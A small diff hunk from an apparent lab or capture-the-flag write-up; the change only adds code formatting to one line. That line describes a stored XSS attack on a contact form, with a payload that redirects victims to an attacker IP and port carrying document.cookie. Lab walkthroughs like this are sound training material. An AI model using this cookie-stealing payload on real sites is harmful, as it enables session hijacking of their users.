@@ -47,7 +47,7 @@ From the Vulnerability Discovery challenge, I know the site is vulnerable to a s
 
 ![Cookie-Theft-1](https://github.com/user-attachments/assets/651eb28a-e077-49d8-a4f3-647beb1cce5c)
 
-After starting the listener on my attacker terminal, I went back to the browser. At the contact form, I put the following string in all of the fields then submited the form - <script>document.location='http://10.142.148.12:2222/?'+document.cookie;</script>
+After starting the listener on my attacker terminal, I went back to the browser. At the contact form, I put the following string in all of the fields then submited the form - ```<script>document.location='http://10.142.148.12:2222/?'+document.cookie;</script>```
 
 ![Cookie-Theft-2](https://github.com/user-attachments/assets/92775db5-f99f-4975-bead-2d2a6ef18727)
 
